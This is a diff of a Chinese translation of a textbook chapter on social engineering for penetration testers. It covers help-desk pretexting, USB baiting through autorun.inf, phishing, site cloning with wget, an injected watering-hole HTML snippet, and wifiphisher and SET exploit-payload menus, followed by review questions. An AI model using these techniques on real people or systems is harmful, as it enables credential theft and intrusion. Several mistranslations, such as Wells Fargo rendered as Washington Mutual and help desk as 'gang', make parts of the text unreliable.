+- 攻击者可以随意在组织内部拨打电话号码或分机号，声称他们是帮助台或 IT 支持人员。最终，他们会碰巧找到一位正在等待支援回电的目标。用户会对回电表示感激，这让我们回到前面提到的原则。首先，这是互惠原则。他们会对帮助表示感激。一旦人们开始联系帮助台，他们往往会感到受阻和沮丧。这在缺乏经验的用户中更为常见，这类用户通常更需要帮助台支持，并且在即使得到指导的情况下，也可能在执行所需操作时遇到困难。这会使他们对回电尤为感激，尤其是如果你能够解决他们的问题。
 
+- 第二个原则是权威。作为帮助台团队的一员，你拥有他们没有的权限和知识。这意味着你拥有一定的权威。正如前面所述，人们倾向于遵循拥有权威的人的指令。如果你建议需要用户名和密码进行身份验证，他们可能会愿意提供这些信息。
 
-
--   攻击者可以随意在组织内部拨打电话号码或分机号，声称他们是帮助台或 IT 支持人员。最终，他们会碰巧找到一位正在等待支援回电的目标。用户会对回电表示感激，这让我们回到前面提到的原则。首先，这是互惠原则。他们会对帮助表示感激。一旦人们开始联系帮助台，他们往往会感到受阻和沮丧。这在缺乏经验的用户中更为常见，这类用户通常更需要帮助台支持，并且在即使得到指导的情况下，也可能在执行所需操作时遇到困难。这会使他们对回电尤为感激，尤其是如果你能够解决他们的问题。
-
--   第二个原则是权威。作为帮助台团队的一员，你拥有他们没有的权限和知识。这意味着你拥有一定的权威。正如前面所述，人们倾向于遵循拥有权威的人的指令。如果你建议需要用户名和密码进行身份验证，他们可能会愿意提供这些信息。
-
--   公司通常会对员工进行培训，通常是每年一次，帮助他们识别社会工程学诈骗。这可能会让工作变得更难，但并非不可能。拥有合理的故事有所帮助，更甚者，如果你能提供公司内部的细节，向人们炫耀，让他们觉得你真的为公司工作，你会更具可信度。
+- 公司通常会对员工进行培训，通常是每年一次，帮助他们识别社会工程学诈骗。这可能会让工作变得更难，但并非不可能。拥有合理的故事有所帮助，更甚者，如果你能提供公司内部的细节，向人们炫耀，让他们觉得你真的为公司工作，你会更具可信度。
 
 ### 饵诱
 
 人们喜欢免费的东西。如果你曾经参加过 IT 相关的会议或展会，可能会注意到长长的排队人群，等着拿取公司发放的任何东西，不管他们需要与否，也不管是否有用。毕竟，有多少个压力球可以拥有？这有什么相关性？你可以利用这一点。过去，你可以把光盘随意放置，看看人们是否会捡起。给它们贴上点有趣的标签——甚至可以是大热专辑的名称。或者，你可以给它起一个诱人的数据集合的名称。任何能够诱使人们拿起磁盘并插入电脑查看里面内容的手段都可以。当然，如今大多数电脑都没有光驱，随手放置光盘的效果不大。
 
-这并不意味着你不能利用人们喜欢免费物品的事实。比如，如果你看到一根 128 GB 的 USB 盾在停车场，你会怎么做？即使是更小的，你会怎么做？相当数量的人会四处张望，看看是否有谁遗落了它，然后捡起。很多人会将盾插入电脑，要么查看里面的内容，要么格式化后自行使用。毕竟，免费东西，谁不想要一根 128 GB 的 USB 盾来传输或备份数据？
+这并不意味着你不能利用人们喜欢免费物品的事实。比如，如果你看到一根 128 GB 的 USB 盾在停车场，你会怎么做？即使是更小的，你会怎么做？相当数量的人会四处张望，看看是否有谁遗落了它，然后捡起。很多人会将盾插入电脑，要么查看里面的内容，要么格式化后自行使用。毕竟，免费东西，谁不想要一根 128 GB 的 USB 盾来传输或备份数据？
 
 当然，并非任何 USB 盾都适用——尤其是空白的 USB 盾。你需要在盾上植入一些有用的软件，以便为你提供帮助。这可能包括提供对用户系统的远程访问。你不能依赖用户直接运行盾上留下的软件，但你可以利用 `autorun.inf` 文件，让你的程序在插入盾片且启用 autorun 时自动运行。显然，并非所有电脑都支持此功能。常见的硬化措施是防止可移动磁盘自动运行任何内容。
 
@@ -9279,18 +10216,15 @@ Many of these go back to the early origins of humanity. Think about social proof
 
 语法也是一个提示。如果你看到可疑的语法，应该对邮件保持警惕。仅仅要求提供联系方式属于低级别的钓鱼攻击，成功率似乎不高。但 419 诈骗仍然屡屡成功，并以各种形式持续存在。有一种理论认为，倾向于相信此类 poorly constructed（结构 poorly）诈骗的人会自行筛选。如果某人容易相信这种低劣诈骗，那么他也可能会把金钱交给攻击者。
 
-
-
-
--   更好的钓鱼邮件是那些被构造得看起来完全合法的，只要你不仔细看的话。这类攻击更有可能成功，而且并不特别难组织。你可以在 [Figure 10.4 中看到这类钓鱼邮件的示例。这是一封伪装成华盛顿互惠银行（Wells Fargo）警告的邮件。如果我与华盛顿互惠银行有业务往来，这封邮件我会非常仔细地查看。它包含一些令人信服的元素。图片正是我期望在华盛顿互惠银行邮件中看到的那种。措辞也相当可靠。我们在这条信息中至少勾选了一个框。首先，我们获得权威 —  — 它说是华盛顿互惠银行。其次，有互惠 —  — 我们会感到被提前警告我们的银行账户可能被 compromises。
+- 更好的钓鱼邮件是那些被构造得看起来完全合法的，只要你不仔细看的话。这类攻击更有可能成功，而且并不特别难组织。你可以在 [Figure 10.4 中看到这类钓鱼邮件的示例。这是一封伪装成华盛顿互惠银行（Wells Fargo）警告的邮件。如果我与华盛顿互惠银行有业务往来，这封邮件我会非常仔细地查看。它包含一些令人信服的元素。图片正是我期望在华盛顿互惠银行邮件中看到的那种。措辞也相当可靠。我们在这条信息中至少勾选了一个框。首先，我们获得权威——它说是华盛顿互惠银行。其次，有互惠——我们会感到被提前警告我们的银行账户可能被 compromises。
 
 ![FIGURE 10.4 Wells Fargo phishing email](img/c10f004.png)
 
 **FIGURE 10.4** Wells Fargo 钓鱼邮件
 
-仔细观察信息后，会发现它更加可疑。鼠标悬停在信中的链接上会显示一个与华盛顿互惠银行毫无关系的 URL。此外，发件人字段中的电子邮件地址是伪造的，甚至不像是一个真实的电子邮件地址。有趣的是，信中还有一个二级链接，只有在悬停时才能看到其 URL，这也与华盛顿互惠银行无关，并且与第一个 URL 明显不同。如果这些 URL 仍然能打开，它们很可能会指向要求验证信息的网站或安装恶意软件的系统 —  — 两者可能同时出现。为什么不同时窃取银行信息，同时安装远程访问程序呢？
+仔细观察信息后，会发现它更加可疑。鼠标悬停在信中的链接上会显示一个与华盛顿互惠银行毫无关系的 URL。此外，发件人字段中的电子邮件地址是伪造的，甚至不像是一个真实的电子邮件地址。有趣的是，信中还有一个二级链接，只有在悬停时才能看到其 URL，这也与华盛顿互惠银行无关，并且与第一个 URL 明显不同。如果这些 URL 仍然能打开，它们很可能会指向要求验证信息的网站或安装恶意软件的系统——两者可能同时出现。为什么不同时窃取银行信息，同时安装远程访问程序呢？
 
-钓鱼是一种有效的策略。正如你可能在“垃圾邮件”文件夹中看到的邮件数量所显示的，它很有利润。再次强调，如果你没有大量此类邮件，我可以保证 —  — 我的邮箱已经存在足够长时间，并且足够出名（并非因为我个人，而是因为邮箱本身的知名度），以至于我上个月就已经拥有足够多的邮件供我们两人参考。如果你针对某一特定公司的员工进行攻击，你已经超出了普通钓鱼，进入了** spear phishing**（定向钓鱼），这意味着你不再使用广撒网的方式去尽可能多地覆盖目标，而是使用“矛头”精准击中特定目标。
+钓鱼是一种有效的策略。正如你可能在“垃圾邮件”文件夹中看到的邮件数量所显示的，它很有利润。再次强调，如果你没有大量此类邮件，我可以保证——我的邮箱已经存在足够长时间，并且足够出名（并非因为我个人，而是因为邮箱本身的知名度），以至于我上个月就已经拥有足够多的邮件供我们两人参考。如果你针对某一特定公司的员工进行攻击，你已经超出了普通钓鱼，进入了 **spear phishing**（定向钓鱼），这意味着你不再使用广撒网的方式去尽可能多地覆盖目标，而是使用“矛头”精准击中特定目标。
 
 钓鱼邮件可能包含附件。这些邮件可能以多种形式出现。我在过去见过的常见做法是发送伪装成发票的附件，受害者被引导打开发票以支付账单。Figure 10.5 显示了类似的情况，假装来自苹果。
 
@@ -9300,11 +10234,11 @@ Many of these go back to the early origins of humanity. Think about social proof
 
 这些附件通常是 PDF 文档。在 Figure 10.5 的邮件中，附件很可能原本是 PDF，但服务器端的防恶意软件将其删除了。PDF 实现以及（到一定程度）格式本身都有漏洞历史。目标可能正在使用的阅读器很有可能被利用。与打开普通可执行文件相比，打开 PDF 更容易让人上当。用户对打开程序的风险很敏感，但可能更倾向于认为 PDF 无害，实际上 PDF 格式本身就能执行嵌入的可执行文件。
 
-钓鱼攻击是渗透测试或红队行动的重要组成部分。使用像 **FiercePhish** 这样的工具来管理你的行动会很有帮助。FiercePhish 提供一个 Web 界面来管理所有的社交工程活动。通过 Web 界面，你可以管理目标列表以及所有想使用的模板。你可能会创建可在不同目标之间重复使用的模板。毕竟，一些最有效的社交工程攻击很可能是那些对受害者有益的攻击。想想那些向受害者提供某种东西的邮件 —  — 这可能会利用受害者的自然贪婪。你可以使用彩票中奖或某种退款来诱骗。
+钓鱼攻击是渗透测试或红队行动的重要组成部分。使用像 `FiercePhish` 这样的工具来管理你的行动会很有帮助。`FiercePhish` 提供一个 Web 界面来管理所有的社交工程活动。通过 Web 界面，你可以管理目标列表以及所有想使用的模板。你可能会创建可在不同目标之间重复使用的模板。毕竟，一些最有效的社交工程攻击很可能是那些对受害者有益的攻击。想想那些向受害者提供某种东西的邮件——这可能会利用受害者的自然贪婪。你可以使用彩票中奖或某种退款来诱骗。
 
 ### 联系垃圾邮件
 
-社交工程的前提是利用或颠覆信任。这也是为什么钓鱼攻击（如前文提到的华盛顿互惠银行信息）常常冒充可靠且熟悉的来源 —  — 受害者更可能信任来自已知来源的信息。联系垃圾邮件（contact spamming）基于同样的思想。这种攻击有几种不同的实现方式。如果电子邮件账户被 compromises，攻击者可以利用通讯录找出受害者认识的人。攻击者若把信息发送给这些熟人，信件看起来就来自受害者信任的对象，成功概率更高。如果发件人地址本身已经被受害者熟知，成功率会更高。
+社交工程的前提是利用或颠覆信任。这也是为什么钓鱼攻击（如前文提到的华盛顿互惠银行信息）常常冒充可靠且熟悉的来源——受害者更可能信任来自已知来源的信息。联系垃圾邮件（contact spamming）基于同样的思想。这种攻击有几种不同的实现方式。如果电子邮件账户被 compromises，攻击者可以利用通讯录找出受害者认识的人。攻击者若把信息发送给这些熟人，信件看起来就来自受害者信任的对象，成功概率更高。如果发件人地址本身已经被受害者熟知，成功率会更高。
 
 不幸的是，进行联系垃圾邮件并不一定需要账户被 compromises。攻击者还可以通过其他方式识别你认识的人。一旦这些联系人被确定，伪造看起来像来自你账户的邮件发送给他们就很容易。
 
@@ -9316,13 +10250,27 @@ Many of these go back to the early origins of humanity. Think about social proof
 
 无论采用何种手段，攻击者通常最终会获取凭证，或至少获得系统或应用的短期访问权限。如果用户能够验证来电或信息真正来自信息技术或帮派人员，这种攻击可以被防止。员工应始终拨打帮派电话以确认问题并从公司内部、已获授权的帮派人员那里获得帮助。
 
+- 另一种使用社交网络进行社会工程的方式是通过他人可能已经窃取的凭据来 compromise 一个账户。账户被 compromise 后，攻击者可以逐步接管该账户，修改密码和其他信息，同时保留联系人/好友列表。这最近发生在我在 LinkedIn 上的时候。我收到一条来自某人的推荐请求，我回复说我不认识他们。在几条来自（据称被 compromise 的）账户的不同消息中，出现了图 10.6 所示的消息。
 
+![FIGURE 10.6 LinkedIn message](img/c10f006.png)
 
--   另一种使用社交网络进行社会工程的方式是通过他人可能已经窃取的凭据来 compromise 一个账户。账户被 compromise 后，攻击者可以逐步接管该账户，修改密码和其他信息，同时保留联系人/好友列表。这最近发生在我在 LinkedIn 上的时候。我收到一条来自某人的推荐请求，我回复说我不认识他们。在几条来自（据称被 compromise 的）账户的不同消息中，出现了图 10.6 所示的消息。
+**FIGURE 10.6** LinkedIn message
 
-![FIGURE 10.6 LinkedIn message**FIGURE 10.6** LinkedIn message 攻击者会利用被 compromise 账户的联系人来尝试获取某些东西。这种类型的社会工程有很多不同的实现方式。攻击者可以使用新获取的“好友”来尝试出售商品或服务，例如。他们还可以尝试获取凭据。一旦社交工程攻击的不信任屏障被移除，几乎所有的社交工程攻击的结果都有可能出现，因为这些消息或请求是来自受信任的人。## 网站攻击即使你使用钓鱼攻击，也可能需要第二个元素。你可以在钓鱼攻击中加入恶意软件，这可以让你获得目标系统的访问权限。这可能比你想要的更复杂，因为它依赖于用户打开附件，或者附件利用系统中的漏洞。相比于让用户打开附件，让用户点击链接要容易得多。尤其是当电子邮件看起来合法，链接也看起来合法时。这意味着，你需要有一个网站供用户连接。如果你以钓鱼为入口，可能会先使用站点克隆，即创建一个看起来像合法站点的复制品，这样当用户连接时不会产生怀疑。### 克隆站点克隆是一个非常容易实现的操作。事实上，你甚至不需要克隆整个站点。你只需要克隆使页面渲染成为可能的 HTML 代码。将任何媒体文件保持在原始位置即可，因为如果它们发生变化，你可以利用这些更新。这样会让克隆站点看起来更可信。如果有人仔细观察，就会看到请求实际上是发送到合法站点而不是你的恶意站点。唯一从你的恶意站点发出的文件是控制页面渲染的 HTML。这并不意味着你不能抓取文件并本地托管。使用像 WinHTTrack 这样的工具，这是可配置的选项，如图 10.7 所示。![FIGURE 10.7 WinHTTrack options](img/c10f007.png)
+攻击者会利用被 compromise 账户的联系人来尝试获取某些东西。这种类型的社会工程有很多不同的实现方式。攻击者可以使用新获取的“好友”来尝试出售商品或服务，例如。他们还可以尝试获取凭据。一旦社交工程攻击的不信任屏障被移除，几乎所有的社交工程攻击的结果都有可能出现，因为这些消息或请求是来自受信任的人。
+
+## 网站攻击
+
+即使你使用钓鱼攻击，也可能需要第二个元素。你可以在钓鱼攻击中加入恶意软件，这可以让你获得目标系统的访问权限。这可能比你想要的更复杂，因为它依赖于用户打开附件，或者附件利用系统中的漏洞。相比于让用户打开附件，让用户点击链接要容易得多。尤其是当电子邮件看起来合法，链接也看起来合法时。这意味着，你需要有一个网站供用户连接。如果你以钓鱼为入口，可能会先使用站点克隆，即创建一个看起来像合法站点的复制品，这样当用户连接时不会产生怀疑。
+
+### 克隆站点
+
+克隆是一个非常容易实现的操作。事实上，你甚至不需要克隆整个站点。你只需要克隆使页面渲染成为可能的 HTML 代码。将任何媒体文件保持在原始位置即可，因为如果它们发生变化，你可以利用这些更新。这样会让克隆站点看起来更可信。如果有人仔细观察，就会看到请求实际上是发送到合法站点而不是你的恶意站点。唯一从你的恶意站点发出的文件是控制页面渲染的 HTML。这并不意味着你不能抓取文件并本地托管。使用像 `WinHTTrack` 这样的工具，这是可配置的选项，如图 10.7 所示。
+
+![FIGURE 10.7 WinHTTrack options](img/c10f007.png)
 
 **FIGURE 10.7** WinHTTrack options
+
+
 
 这些选项当然是可选的。默认情况下，WinHTTrack 不会抓取媒体文件，只会抓取 HTML。它会克隆整个站点，这意味着它会遍历所有链接。WinHTTrack 使用项目来克隆站点，因此这是一个多步骤的过程。在图 10.8 中，你可以看到在输入 URL 的那一步。你也可以输入多个 URL 以一次性下载多个站点。你需要将操作改为“Download All Sites In Pages”。你也可以使用 WinHTTrack 来测试站点而非下载它们，这意味着你可以检查书签列表以确认它们是否仍然有效。
 
@@ -9332,7 +10280,7 @@ Many of these go back to the early origins of humanity. Think about social proof
 
 **FIGURE 10.8** Site cloning with WinHTTrack
 
-**使用 wget 镜像网站**
+### 使用 wget 镜像网站
 
 ```
 root@quiche:~# wget -m https://www.wiley.com
@@ -9371,14 +10319,11 @@ root@quiche:~# wget -m https://www.wiley.com
 
 伪装网站是指用户可能认为是合法的，但实际上具有恶意目的的网站。这可能是一个看起来与合法站点完全相同的站点，使用前面提到的站点克隆技术，但其完全限定域名（URL）与通常的 URL 不同。攻击者可以注册常见拼写错误的域名并等待人们访问。这种手法称为 *typosquatting*（拼写错误劫持）。例如，你可以注册 `gogle.com` 并克隆 `google.com`，在托管该站点的服务器上提供页面。你也可以称之为 *URL 劫持*。
 
-
-
-
 *Rogue* 不一定意味着你创建了一个假站点，但它可能表示你正在使用合法平台在其不知情的情况下发起攻击。水坑攻击是一种社交工程攻击，利用人们经常访问的网站进行攻击。在野外，水坑是动物经常聚集的地方，甚至可能逗留的地方。因为水是生命所必需，且并非所有动物都能从食物中摄取到足够的水分，水坑是等待动物光顾的理想地点。这种攻击方式与此类似。
 
 在水坑攻击中，你会获得一个被大量访问的网站并向其植入恶意软件。这并不意味着该攻击易于执行，但通过使用它，你有潜力快速获取大量系统。与仅仅入侵单个系统不同，如果你入侵一个被目标人群频繁访问的网站，就能通过入侵单个系统获取许多系统的访问权限。一旦克服了入侵网站的难关——例如，如果你入侵 `espn.com`，你会看到大量男性经常前往该站点——攻击的实施就变得容易了。下面的代码片段展示了在 `index.html` 页面底部添加的几行内容。
 
-**带有 Applet 引用的攻击 HTML**
+### 带有 Applet 引用的攻击 HTML
 
 ```
  </script>
@@ -9392,7 +10337,7 @@ root@quiche:~# wget -m https://www.wiley.com
 
 水坑攻击并非唯一的网络基础攻击，但它们具有针对性的优势，通常在针对组织时更为有用。你可以在内部服务器上植入攻击，因为公司员工经常访问这些网站，从而可能在被 compromized 主机上获取大量桌面系统。
 
-**无线社交工程**
+### 无线社交工程
 
 Wi‑Fi 网络已无处不在，且许多设备根本不支持有线连接，这使得人们普遍期望能够使用 Wi‑Fi 网络。你可以利用这一点。几乎任何地方都能找到大量 Wi‑Fi 网络列表。仅在我的客厅里，一个小社区就有将近二十个可用的 Wi‑Fi 网络。你可以在 Figure 10.9 中看到该列表。网络命名没有限制，也没有中央登记机构。即使在同一物理空间内，也可以有重名的网络。客户端决定实际连接哪个网络。
 
@@ -9412,7 +10357,7 @@ WPA 并未完全成功，随后出现了 WPA2，最终被 WPA3 取代。WEP 使�
 
 另一种方法是使用 `wifiphisher`。该程序会自动处理很多工作，包括创建能够在目标系统上安装软件的情景。其在线文档已过时。与其通过命令行传递所有参数不同，直接运行程序并在交互式界面中做出选择同样方便。启动后，你会看到它会设置一对无线接口，然后启动 DHCP 服务器和 `iptables`，这两者都是让用户看似合法连接到接入点所必需的。
 
-**启动 wifiphisher**
+### 启动 wifiphisher
 
 ```
  kilroy@portnoy:~$ sudo wifiphisher
@@ -9427,8 +10372,6 @@ WPA 并未完全成功，随后出现了 WPA2，最终被 WPA3 取代。WEP 使�
  [*] Cleared leases, started DHCP, set up iptables
           
 ```
-
-
 
 一旦你启动 `wifiphisher`，它会列出所有在系统范围内的 SSID。这里是你选择要伪装的 SSID 以获取凭据的地方。你可以在 Figure 10.10 中看到此选择。正如屏幕上显示的，你需要向下滚动选择要伪装的 SSID，然后按回车确认。你可能已经注意到在前面的输出中，有一个无线接口将被用于 deauthentication 攻击。这意味着当 `wifiphisher` 运行时，它会向看起来已连接到真实接入点的系统发送 deauthentication 帧。这将迫使那些客户端重新认证，理想情况下它们会与你建立连接。
 
@@ -9450,7 +10393,7 @@ WPA 并未完全成功，随后出现了 WPA2，最终被 WPA3 取代。WEP 使�
 
 由于钓鱼是野外最常见且最易实施的攻击之一，我们可以从自动化钓鱼攻击开始。我们将使用 Metasploit 来协助，更具体地说，我们将使用一个在 Metasploit 之上作为叠加的程序 —  — 社会工程工具包 (SET)。这是一个基于菜单的程序，利用 Metasploit 的模块和功能，但会自动整合它们，帮助你完成社会工程攻击所需的任务。下面的代码片段展示了 SET 的初始菜单。该程序功能强大，但我们这里只做简要浏览，而不会深入探讨全部功能。
 
-**Social‑Engineer Toolkit 起始菜单**
+### Social‑Engineer Toolkit 起始菜单
 
 ```
    The Social-Engineer Toolkit is a product of TrustedSec.
@@ -9479,7 +10422,7 @@ WPA 并未完全成功，随后出现了 WPA2，最终被 WPA3 取代。WEP 使�
 
 选择 **Social‑Engineering Attacks** 后会打开另一个菜单，这里需要输入菜单项的编号。整个程序多年来不断增长其功能。这一点在 **Social‑Engineering Attacks** 菜单的向量数量上表现明显，你可以在下面的列表中看到。你可能会注意到有两种钓鱼攻击向量：一种是大规模发送邮件，另一种是定向 spear phishing。区别在于预期的收件人数量。
 
-**Social‑Engineer Toolkit 社交工程攻击**
+### Social‑Engineer Toolkit 社交工程攻击
 
 ```
  Select from the menu:
@@ -9502,7 +10445,7 @@ WPA 并未完全成功，随后出现了 WPA2，最终被 WPA3 取代。WEP 使�
 
 无论你选择哪一项，都可以向单个地址或多个地址发送。下面的代码片段展示了不同选项之间的差异。
 
-**Spear‑phishing 向量**
+### Spear‑phishing 向量
 
 ```
     1) Perform a Mass Email Attack
@@ -9510,7 +10453,7 @@ WPA 并未完全成功，随后出现了 WPA2，最终被 WPA3 取代。WEP 使�
     3) Create a Social-Engineering Template
 ```
 
-**Mass Mailer 向量**
+### Mass Mailer 向量
 
 ```
      1.  Email Attack Single Email Address
@@ -9519,13 +10462,15 @@ WPA 并未完全成功，随后出现了 WPA2，最终被 WPA3 取代。WEP 使�
  
 ```
 
-我们将重点观察 **Mass Email Attack** 向量，因为其基本步骤在不同的邮件攻击中是相同的。Mass Email Attack 允许我们使用文件格式漏洞。可用的 payload 是 Metasploit 中已有的文件格式 exploit，这些文件格式常被利用且成功率有希望。
 
-**文件格式漏洞的 Payload**
+
+我们将重点观察`Mass Email Attack`向量，因为其基本步骤在不同的邮件攻击中是相同的。`Mass Email Attack`允许我们使用文件格式漏洞。可用的 payload 是 Metasploit 中已有的文件格式 exploit，这些文件格式常被利用且成功率有希望。
+
+### 文件格式漏洞的 Payload
 
 ```
             ********** PAYLOADS **********
- 
+
      1) SET Custom Written DLL Hijacking Attack Vector (RAR, ZIP)
      2) SET Custom Written Document UNC LM SMB Capture Attack
      3) MS15-100 Microsoft Windows Media Center MCL Vulnerability
@@ -9548,8 +10493,8 @@ WPA 并未完全成功，随后出现了 WPA2，最终被 WPA3 取代。WEP 使�
     20) Nuance PDF Reader v6.0 Launch Stack Buffer Overflow
     21) Adobe Reader u3D Memory Corruption Vulnerability
     22) MSCOMCTL ActiveX Buffer Overflow (ms12-027)
-          
- 
+
+
 ```
 
 文件格式告诉我们将如何利用系统。这将让我们在远程系统上运行任意代码；我们只需要确定那段任意代码是什么。我们的 payload 将基于我们选择的文件格式漏洞类型。如果选择列表中的第一种文件格式，则会得到一系列 payload，默认是 Meterpreter 内存注入。该 payload 会将 Meterpreter shell 发送回我们这边，前提是我们已设置好 handler。
@@ -9558,10 +10503,7 @@ WPA 并未完全成功，随后出现了 WPA2，最终被 WPA3 取代。WEP 使�
 
 ## 总结
 
-
-
-
--   [社交工程](https://example.org)是一种自人类拥有欲望和需求以来就存在的技能。一旦你了解社交工程的原理，就能开始识别自己正在被操纵的地方。社交工程的原理包括互惠、承诺、社会证明、权威、好感和稀缺。这些关键原则可以用来诱导人们做出他们本不愿意做的行为。这可能包括让你获得系统或信息的访问权限，也可能是让你泄露用于进行其他攻击的凭证。
+- [社交工程](https://example.org)是一种自人类拥有欲望和需求以来就存在的技能。一旦你了解社交工程的原理，就能开始识别自己正在被操纵的地方。社交工程的原理包括互惠、承诺、社会证明、权威、好感和稀缺。这些关键原则可以用来诱导人们做出他们本不愿意做的行为。这可能包括让你获得系统或信息的访问权限，也可能是让你泄露用于进行其他攻击的凭证。
 
 当你准备进行社交工程攻击时，伪造（pretexting）至关重要。伪造是指你将要讲述的故事。你可以在电子邮件中，甚至在诈骗电话中看到伪造的例子。419 诈骗很常见，是伪造的一个好例子。你被讲述一个故事，而这个故事很可能让你相信，主要是因为有数百万美元的承诺。谁不想拥有足够的钱，辞掉工作，在塔希提海滩上生活呢？伪造就是你向目标讲述的故事。一个好的伪造故事能够覆盖所有角度，让你在目标提问或提出异议时不必手足无措、答不上来。你已经全部掌握，这可能需要进行研究，尤其是当你针对组织内的员工时，他们可能接受过防范社交工程攻击的培训。
 
@@ -9576,216 +10518,262 @@ WPA 并未完全成功，随后出现了 WPA2，最终被 WPA3 取代。WEP 使�
 虽然这些攻击可以手动完成，但自动化许多操作会更加容易。下面是一些有用的工具：
 
 - `wifiphisher`：可以自动化创建野生接入点的过程。
+
 - SET（Social Engineering Toolkit）：可以自动化社交工程攻击，利用 Metasploit 及其 payloads 和 modules 来支持这些攻击。
 
 ### Review Questions
 
-1.  你接到一通电话，对方声称自己是国税局（IRS）的代表，并威胁如果你不立即提供支付方式就会立刻派警察来逮捕你。对方使用的是哪种战术？
+1. 你接到一通电话，对方声称自己是国税局（IRS）的代表，并威胁如果你不立即提供支付方式就会立刻派警察来逮捕你。对方使用的是哪种战术？
 
-    1. Pretexting  
-    2. Biometrics  
-    3. Smishing  
-    4. Rogue access  
+   1. Pretexting
 
-2.  你正在参与红队（red team）任务，团队负责人要求你使用**baiting**（诱饵）来获取入口。你被要求做什么？
+   2. Biometrics
 
-    1. 打电话  
-    2. 克隆网站  
-    3. 丢置 USB 随身碟  
-    4. 伪造 RFID ID  
+   3. Smishing
 
-3.  当你看到在安全会议的供应商摊位前排起长队，等待领取免费 USB 随身碟和光盘时，使用的是哪种社交工程原则？
+   4. Rogue access
 
-    1. 互惠（Reciprocity）  
-    2. 社会证明（Social proof）  
-    3. 权威（Authority）  
-    4. 稀缺（Scarcity）  
+2. 你正在参与红队（red team）任务，团队负责人要求你使用`baiting`（诱饵）来获取入口。你被要求做什么？
 
-4.  针对**tailgating**（尾随）这一攻击，以下哪种措施是可行的防护手段？
+   1. 打电话
 
-    1. 生物特征认证（Biometrics）  
-    2. 刷卡访问（Badge access）  
-    3. 电话验证（Phone verification）  
-    4. 人阱（Man traps）  
+   2. 克隆网站
 
-5.  使用**无线社交工程**的主要目的是什么？
+   3. 丢置 USB 随身碟
 
-    1. 发送钓鱼消息  
-    2. 收集凭证  
-    3. 获取电子邮件地址  
-    4. 进行电话诈骗  
+   4. 伪造 RFID ID
 
-6.  哪种社交工程原则能够让一次假冒客服电话（help desk）的电话更具说服力？
+3. 当你看到在安全会议的供应商摊位前排起长队，等待领取免费 USB 随身碟和光盘时，使用的是哪种社交工程原则？
 
-    1. 社会证明（Social proof）  
-    2. 模仿（Imitation）  
-    3. 稀缺（Scarcity）  
-    4. 权威（Authority）  
+   1. 互惠（Reciprocity）
 
-7.  使用自动化工具进行社交工程攻击的原因是什么？
+   2. 社会证明（Social proof）
 
-    1. 更好地控制结果  
-    2. 降低复杂度  
-    3. 实现社会证明  
-    4. 展示权威  
+   3. 权威（Authority）
 
-8.  如果你想获取进入建筑物的访问权限，应该使用哪种社交工程向量？
+   4. 稀缺（Scarcity）
 
-    1. 冒充（Impersonation）  
-    2. 稀缺（Scarcity）  
-    3. 语音钓鱼（Vishing）  
-    4. 短信钓鱼（Smishing）  
+4. 针对`tailgating`（尾随）这一攻击，以下哪种措施是可行的防护手段？
 
-9.  下列哪项是**pretexting**（伪造）的例子？
+   1. 生物特征认证（Biometrics）
 
-    1. 要求输入凭证的网页  
-    2. 克隆的徽章  
-    3. 前同事发来的电子邮件  
-    4. 野生无线接入点  
+   2. 刷卡访问（Badge access）
 
-10.  哪个工具可以用于克隆网站？
+   3. 电话验证（Phone verification）
 
-    1. `httclone`  
-    2. `curl-get`  
-    3. `wget`  
-    4. `wclone`  
+   4. 人阱（Man traps）
 
-11.  为了防止**baiting**（诱饵）攻击成功，应该采取哪项措施？
+5. 使用无线社交工程的主要目的是什么？
 
-    1. 禁用注册表克隆。  
-    2. 禁用 autorun。  
-    3. 使用环氧封堵外部端口。  
-    4. 不要浏览 Internet。  
+   1. 发送钓鱼消息
 
-12.  当你考虑实施生物特征认证时，更可能关注哪项统计指标？
+   2. 收集凭证
 
-    1. 假正率（False positive rate）  
-    2. 假负率（False negative rate）  
-    3. 假失败率（False failure rate）  
-    4. 假接受率（False acceptance rate）  
+   3. 获取电子邮件地址
 
-13.  哪种生物特征最不容易获得高真接受率（true accept rate）并同时将假拒率（false reject rate）降到最低？
+   4. 进行电话诈骗
 
-    1. 声音指纹（Voiceprint）  
-    2. 彩色扫描（Iris scanning）  
-    3. 视网膜扫描（Retinal scanning）  
-    4. 指纹扫描（Fingerprint scanning）  
+6. 哪种社交工程原则能够让一次假冒客服电话（help desk）的电话更具说服力？
 
-14.   proximity 卡（proximity card）最容易受到哪种攻击？
+   1. 社会证明（Social proof）
 
-    1. 尾随（Tailgating）  
-    2. 钓鱼（Phishing）  
-    3. 凭证窃取（Credential theft）  
-    4. 克隆（Cloning）  
+   2. 模仿（Imitation）
 
-15.  哪种生物特征扫描的是眼球周围（虹膜）的图案？
+   3. 稀缺（Scarcity）
 
-    1. 视网膜扫描（Retinal scanning）  
-    2. 指纹扫描（Fingerprint scanning）  
-    3. 彩色扫描（Iris scanning）  
-    4. 乌维扫描（Uvea scanning）  
+   4. 权威（Authority）
 
-16.  高假负率（false failure rate）会导致什么结果？
+7. 使用自动化工具进行社交工程攻击的原因是什么？
 
-    1. 人们需要联系安保人员  
-    2. 未经授权的人员被允许进入  
-    3. 强制使用人阱（man trap）  
-    4. 减少生物特征认证的使用  
+   1. 更好地控制结果
 
+   2. 降低复杂度
 
+   3. 实现社会证明
 
+   4. 展示权威
+
+8. 如果你想获取进入建筑物的访问权限，应该使用哪种社交工程向量？
+
+   1. 冒充（Impersonation）
+
+   2. 稀缺（Scarcity）
+
+   3. 语音钓鱼（Vishing）
+
+   4. 短信钓鱼（Smishing）
+
+9. 下列哪项是`pretexting`（伪造）的例子？
+
+   1. 要求输入凭证的网页
+
+   2. 克隆的徽章
+
+   3. 前同事发来的电子邮件
+
+   4. 野生无线接入点
+
+10. 哪个工具可以用于克隆网站？
+
+   1. `httclone`
+
+   2. `curl-get`
+
+   3. `wget`
+
+   4. `wclone`
+
+11. 为了防止`baiting`（诱饵）攻击成功，应该采取哪项措施？
+
+   1. 禁用注册表克隆。
+
+   2. 禁用 autorun。
+
+   3. 使用环氧封堵外部端口。
+
+   4. 不要浏览 Internet。
+
+12. 当你考虑实施生物特征认证时，更可能关注哪项统计指标？
+
+   1. 假正率（False positive rate）
+
+   2. 假负率（False negative rate）
+
+   3. 假失败率（False failure rate）
+
+   4. 假接受率（False acceptance rate）
+
+13. 哪种生物特征最不容易获得高真接受率（true accept rate）并同时将假拒率（false reject rate）降到最低？
+
+   1. 声音指纹（Voiceprint）
+
+   2. 彩色扫描（Iris scanning）
+
+   3. 视网膜扫描（Retinal scanning）
+
+   4. 指纹扫描（Fingerprint scanning）
+
